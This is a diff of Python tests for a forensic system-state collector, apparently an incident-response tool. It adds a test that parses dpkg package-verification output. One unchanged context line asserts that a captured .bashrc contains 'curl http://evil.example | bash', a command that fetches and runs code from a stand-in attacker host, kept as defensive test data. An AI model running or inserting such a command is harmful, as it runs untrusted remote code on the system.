@@ -749,7 +749,7 @@ def test_user_collector_reads_from_source(tmp_path):
 
 def test_all_collectors_registered():
     from ubuntils.collectors import ALL_COLLECTORS
-    assert len(ALL_COLLECTORS) == 8
+    assert len(ALL_COLLECTORS) == 9
 
 
 def test_all_collectors_are_base_collector_subclasses():
@@ -782,3 +782,33 @@ def test_environment_collector_captures_shell_init_files(tmp_path):
     assert entry["source"] == "/home/alice/.bashrc"
     assert "curl http://evil.example | bash" in entry["content"]
     assert entry["ctime"] > 0
+
+
+def test_package_collector_parses_dpkg_verify(tmp_path):
+    from ubuntils.collectors.packages import PackageCollector
+    from ubuntils.collectors.source import BundleSource
+
+    cmds = tmp_path / "commands"
+    cmds.mkdir()
+    (cmds / "dpkg_verify.txt").write_text(
+        "??5?????? c /etc/ssh/sshd_config\n"
+        "missing   /usr/bin/sshd\n"
+        "....5..T. /usr/bin/passwd\n"
+    )
+    (cmds / "lsattr_sensitive.txt").write_text("")
+    (cmds / "find_setuid.txt").write_text("")
+    src = BundleSource(
+        root_dir=str(tmp_path / "files"),
+        command_index={
+            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
+            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
+            "find_setuid": str(cmds / "find_setuid.txt"),
+        },
+    )
+
+    result = PackageCollector(source=src).collect()
+
+    entries = result["dpkg_verify_entries"]
+    assert {"path": "/etc/ssh/sshd_config", "flags": "??5??????", "is_conffile": True, "missing": False} in entries
+    assert {"path": "/usr/bin/sshd", "flags": "", "is_conffile": False, "missing": True} in entries
+    assert {"path": "/usr/bin/passwd", "flags": "....5..T.", "is_conffile": False, "missing": False} in entries
